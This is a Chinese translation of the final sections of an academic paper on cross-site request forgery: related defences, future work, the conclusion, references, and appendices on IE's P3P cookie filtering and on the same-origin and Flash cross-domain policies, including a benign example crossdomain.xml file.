与我们的方案类似的服务器端保护措施已经被实现了，但是对标准要求的缺失造成了一些本可避免的问题。如前所述，Johns和Winter`[24]`和Schreiber`[27]`的方案需要服务器状态已知，而Shiett`[28]`的方案中断了多选项卡式浏览。Jovanovic等人`[26]`通过在web服务器和web应用程序间添加代理，创建了一种利用CSRF防御机制来改进遗留应用程序的方法。这些防御程序要求缓冲所有数据并修改应用程序中的链接。还需要重写某些应用程序的调用。这种方案在不能重写应用程序的情况下是有效的，但不如直接向应用程序中添加CSRF防御机制。这个方案针对的是希望保护其服务器上的应用程序免受CSRF攻击的管理员，而我们的方案针对的是希望将CSRF防御机制直接添加到其应用程序中的Web应用和框架的开发人员。

## 6 未来展望

考虑到CSRF漏洞的盛行，可以自动扫描这些漏洞的方法将非常有用。Bortz和Boneh`[18]`介绍过跨站点定时攻击（Cross-Site Timing Attacks），这种攻击与CSRF攻击结合起来会进一步损害用户隐私。

我们实现的客户端浏览器插件是一个基于Firefox的扩展包，只能在Firefox上工作。当然，也可以为其他浏览器编写类似的插件。同样地，我们的Code Igniter扩展包所使用的服务器端解决方案也可以在其他框架中轻松实现。

我们的客户端浏览器插件是Adobe除Flash程序之外第一个实现跨域策略的。未来可以做更多的试验以实现在其他环境中更好地利用这个策略，用于增加用户安全性和站点灵活性。

## 7 总结

CSRF攻击的诊断、利用和修复相对简单。站点可以在几秒钟内被解析；攻击可以在几分钟内被构建。对于这些攻击的盛行，最合理的解释是，web开发人员没有意识到这个问题，或者（错误地）认为防御广为人知的跨站点脚本攻击的措施也能抵御CSRF攻击。我们希望本文提及到的攻击手段能阐明CSRF攻击的危险性，并使Web开发人员给予这些攻击应有的关注度。当Web开发人员了解了CSRF攻击后，他们就能使用类似于我们创建的工具来保护自己。

我们建议框架创建者将CSRF防护机制添加到框架中，从而保护建立在该框架上的任意站点。在框架级别构建CSRF防护机制使开发人员不必重复代码，甚至不需要详细理解CSRF攻击（尽管我们建议了解这些攻击）。每个站点都可抵御CSRF攻击后，用户就可以使用我们的Firefox浏览器插件来保护自己了。当然，也可以为其他浏览器编写类似的插件。

CSRF和类似漏洞出现的根本原因可能在于当前Web协议的复杂性以及Web从数据呈现工具逐渐发展到交互式服务平台的过程。随着浏览器客户端提供的功能越来越多，且越来越多的站点涉及到复杂的编程和客户端-服务器交互服务，若不采用防御措施，CSRF和相关攻击将变得更加普遍。随着Web技术复杂性的不断提高，未来可能会出现更多新的攻击类型。

## 参考文献

* [1] [关于Metaﬁlter](http://www.metafilter.com/about.mefi)
* [2] [允许跨域数据加载](http://livedocs.adobe.com/flash/9.0/main/wwhelp/wwhimpl/common/html/wwhelp.htm?context=LiveDocs_Parts&file=00001085.html)
* [3] [Catalyst](http://www.catalystframework.org/)
* [4] [Code Igniter](http://www.codeigniter.com/)
* [5] [django](http://www.djangoproject.com/)
* [6] [Metaﬁlter：忘记密码？](http://www.metafilter.com/login/lostpassword.mefi)
* [7] [IE浏览器 6中的隐私问题](http://msdn2.microsoft.com/en-us/library/ms537343.aspx)
* [8] [Ruby on Rails](http://www.rubyonrails.org)
* [9] [Struts](http://struts.apache.org/)
* [10] [纽约时报：2007年媒体资料包（Media Kit 2007）](http://www.nytimes.whsites.net/mediakit/pages/d_aud_target.html)
* [11] [同源策略](http://livedocs.adobe.com/flash/9.0/main/wwhelp/wwhimpl/common/html/wwhelp.htm) （笔者提供链接已失效，这里提供[新的参考链接](https://en.wikipedia.org/wiki/Same-origin_policy)，仅供参考。）
* [12] [Web安全威胁分类](http://www.webappsec.org/projects/threat/)
* [13] [YouTube资料页](http://www.youtube.com/t/fact_sheet)
* [14] [Ellacoya数据显示Web流量超越Peer-to-Peer(P2P)占据网络最大带宽百分比 （2006年10月）](http://www.ellacoya.com/news/pdf/2007/NXTcommEllacoyaMediaAlert.pdf)
* [15] [ING新闻稿（2006年8月）](http://www.rsa.com/press_release.aspx?id=7220)
* [16] [Alexa顶级站点（2007年9月）](http://www.alexa.com/site/sales)
* [17] A. Barth, C. Jackson, and J. C. Mitchell. Robust Defenses for Cross-Site Request Forgery（跨站点请求伪造的防御手段）. In CCS, 2008.
* [18] A. Bortz and D. Boneh. Exposing private information by timing web applications（暴露隐私的定时Web应用程序）. In *WWW ’07: Proceedings of the 16th international conference on World Wide Web*（第十六届万维网国际会议论文集）, pages 621–628, New York, NY, USA, 2007. ACM Press.
* [19] [J. Burns. 跨站点引用伪造：一个常见的web应用程漏洞。（2005年）](http://www.isecpartners.com/documents/XSRF_Paper.pdf)
* [20] [D. Endler. 跨站点脚本攻击的发展过程。（2002年5月）](http://cgisecurity.com/lib/XSS.pdf)
* [21] R. Fielding, J. Gettys, J. Mogul, H. Frystyk, L. Masinter, P. Leach, and T. Berners-Lee. HypertextTransfer Protocol（超文本传输协议） – HTTP/1.1, 1999.
* [22] J. Franks, P. Hallam-Baker, J. Hostetler, S.Lawrence,P.Leach,A.Luotonen,andL.Stewart. HTTP Authentication: Basic and Digest Access Authentication（HTTP认证：基本和摘要访问认证）, 1999.
* [23] [J. Grossman. CSRF，沉睡的巨人.（2006年9月）](http://jeremiahgrossman.blogspot.com/2006/09/csrf-sleeping-giant.html)
* [24]  M. Johns and J. Winter. *RequestRodeo*: Client Side Protection against Session Riding（客户端会话劫持抵御机制）. In F. Piessens, editor, *Proceedings of the OWASP Europe 2006 Conference, refereed papers track*（欧洲OWASP会议录2006次会议纪要）, Report CW448, pages 5 – 17. Departement Computerwetenschappen, Katholieke Universiteit Leuven, May 2006.
* [25]  M. Johns and J. Winter. Protecting the Intranet Against “JavaScript Malware” and Related Attacks（保护内联网免受“JavaScript恶意软件”和相关攻击影响）. In *DIMVA*, 2007.
* [26] N. Jovanovic, E. Kirda, and C. Kruegel. Preventing Cross Site Request Forgery Attacks（抵御跨站点请求伪造攻击）. Securecomm and Workshops, 2006, pages 1–10, Aug. 28 2006Sept. 1 2006.
* [27] [T. Schreiber. 会话劫持：当今Web应用程序中的普遍漏洞.（2004年）](http://www.securenet.de/papers/Session_Riding.pdf)
* [28] [C. Shiﬂett. 安全之角：跨站点请求伪造.（2004年12月）](http://shiflett.org/articles/cross-site-requestforgeries)
* [29] [C. Shiﬂett. The crossdomain.xml Witch Hunt.（crossdomain.xml造成的危害）（2006年10月）](http://shiflett.org/blog/2006/oct/the-crossdomain.xml-witch-hunt)
* [30] [C.Shiﬂett. 跨域Ajax与Flash的危害 .（2006年9月）](http://shiflett.org/blog/2006/sep/the-dangers-of-cross-domainajax-with-flash)

## 附录A IE浏览器与CSRF

Cookie可用于跟踪许多网站的用户。例如，假设广告商在其服务器上托管一幅图像（广告），该图像（广告）会包含在大量发布者站点中。广告商可以在显示图像时设置一个cookie，这意味着广告商可以在单个用户访问不同的发布者站点时识别该用户。也就是说，当用户访问这些站点并加载广告商的图像时，他的cookie将被发送回广告商，并被唯一地识别。广告商可以使用这些cookie来收集关于用户生活习惯的数据。

cookie对用户隐私的不利影响催生了隐私参数项目平台（*Platform for Privacy Preferences*，P3P）。P3P“提供了一种通用的语法和传输机制来安全传递用户隐私数据到IE 6（或任意其他用户代理）”`[7]`。从IE 6开始，微软要求所有站点都包含P3P策略，以便接收第三方cookie。

据微软：高级cookie过滤通过评估网站处理隐私的措施，并根据站点策略的严谨程度以及用户的喜好来决定哪些cookie可被接受。在默认设置中，收集个人身份信息且不允许用户在其使用中进行选择的cookie会被判定为“用户不满意的”。默认情况下，当浏览会话结束时，用户不满意的cookie将在第一方（站点）中被删除。**在第三方（站点）中被拒绝**`[7]`。

（请注意，P3P策略未经官方认证。如果站点*声称*具有可接受的策略，IE浏览器将允许第三方cookie。）

假设用户访问了包含托管在第三方站点上的图像的页面。在使用P3P的情况下，用户打开的页面被认为是安全时，第三方站点却存在着潜在的危险。而对于CSRF漏洞，情况正好相反——用户打开的页面存在潜在的危险，而第三方站点被认为是安全的（且可能成为攻击目标）。当IE浏览器识别第三方站点有危险时，它会阻止发送cookies到该站点。这有效地抵御了使用“会话cookie”的CSRF攻击，因为IE浏览器会从跨站点请求中剔除身份认证信息。

IE浏览器的P3P策略对CSRF漏洞有一个有意思的影响。具有有效P3P策略的站点不受CSRF攻击的防护（IE浏览器认为这些站点安全并允许发送cookie），而不具有P3P策略的站点反而受到保护（IE浏览器认为这些站点不安全并阻止发送cookie）。注意，这仅适用于使用cookie进行身份验证的站点，使用其他类型身份验证的站点仍可能易受CSRF攻击。

综上所述，当使用“会话cookie”身份验证方式且目标站点不具有P3P策略时，IE浏览器对P3P的使用可使IE浏览器的用户免受CSRF攻击。这种“防护”是P3P策略的一个意外结果，不应作为专业手段抵御CSRF攻击。站点还是应该实现服务器端防护方案，如第4.1节中所述。

## 附录B 同源策略

对Web浏览器来说，难点在于使用户保持与多个网站之间安全、秘密的连接，同时允许用户访问包含不可信代码的不可信站点。此外，站点还需能加载来自不同域的资源。例如，站点`a.com`可以分别使用`<img>`或`<script>`标签从`b.com`加载图像或JavaScript。然而，若用户登录到可信站点，这时不可信的第三方显然不能读取可信站点上的内容。对于允许不受信任的站点显示来自外部站点的数据，同时仍保持该数据的隐私性的需求，催生了同源策略`[11]`。该策略同时定义了访问不同来源的数据时“origin”的含义和站点可执行的权利。该策略认为“若两个页面使用的协议、端口（假设给定）和主机相同，则这两个页面来源相同”`[11]`。根据同源策略，站点不能从不同源处读取或修改资源，但它可以向不同源发送资源请求。这样一来，虽然`evil.com`可使用`<img>`标记在其站点中包含图像`http://trusted.com/image.gif`，但它不能读取该图像的像素数据。类似地，虽然`evil.com`可以使用`<iframe>`标记在其站点中包含`http://trusted.com/private.htm`，但它不能访问或修改浏览器显示的页面的内容。

同源策略只阻止第三方站点从其他站点读取数据，而不阻止这些第三方站点发送请求。由于CSRF攻击是由发送请求引起的（导致服务器端执行某些操作），所以同源策略不能抵御CSRF攻击，它只保护第三方站点上的数据隐私。

站点有时需要在不同的域之间进行通信。Adobe提出了一种称为跨域策略`[2]`的机制，该机制允许其Flash插件在某些情况下与不同的域通信（发送和接收数据）。该机制目前仅允许Flash使用。特别地，网站可以指定哪些第三方网站可以访问它。第三方站点只能在它处于可信站点的跨域策略文件列表中时才能与该可信站点通信。下面的示例跨域策略文件允许来自`www.friendlysite.com`、`*.trusted.com`和IP地址`64.233.167.99`的请求。这些文件被命名为`crossdomain.xml`，放置在域的根目录下。

```xml
<?xml version="1.0"?>
<cross-domain-policy>
<allow-access-from domain="www.friendlysite.com" />
<allow-access-from domain="*.trusted.com" />
<allow-access-from domain="64.233.167.99" />
</cross-domain-policy>
```
假设上面的文件地址为`http://trusted.com/crossdomain.xml`。如果`evil.com`使用Flash向`http://trusted.com/private.htm`发出请求，Flash首先将加载`http://trusted.com/crossdomain.xml`来验证`evil.com`是否被列为可信域。由于它不在列表中，所以请求将被阻止。另一方面，Flash允许来自`www.friendlysite.com`的同样请求，因为它在允许的域列表中。

如果使用得当，Adobe的跨域策略会比同源策略对CSRF攻击提供更强的抵御能力（除非找到匹配的`crossdomain.xml`，否则攻击者甚至不能发起请求）和更强的灵活性（假设目标站点信任起始站点）。然而，跨域策略经常被不当使用，若目标站点包含“accept all”子句，无论是恶意的还是良性的任意第三方站点都可对其进行访问。这种对`crossdomain.xml`文件的不恰当且极其危险的引用甚至被一个Adobe附属`注8`站点`crossdomainxml. org`永久使用。这个站点就是这种“accept all”的跨域策略的一个示例，但它却丝毫未解释使用此策略涉及到的危险。有关使用此类跨域策略文件的危险性的更多信息，请参见Chris Shiﬂett的研究(`[30]`和`[29]`)。

`注8`：`crossdomainxml.org`域注册在PowerSDK软件公司的Theodore E Patrick名下，他在[领英上的个人简介](http://www.linkedin.com/in/tedpatrick)是“Adobe系统平台上的Flex技术传道者”。

我们分析了500个顶级网站`[16]`，发现其中有143个使用了`crossdomain.xml`策略文件。在这143个站点中，47个站点接受来自第三方站点的所有连接请求，这可能导致CSRF漏洞。谨慎使用Adobe的跨域策略可以保证其安全有效。这要求我们必须认识到“accept all”方案的危险性。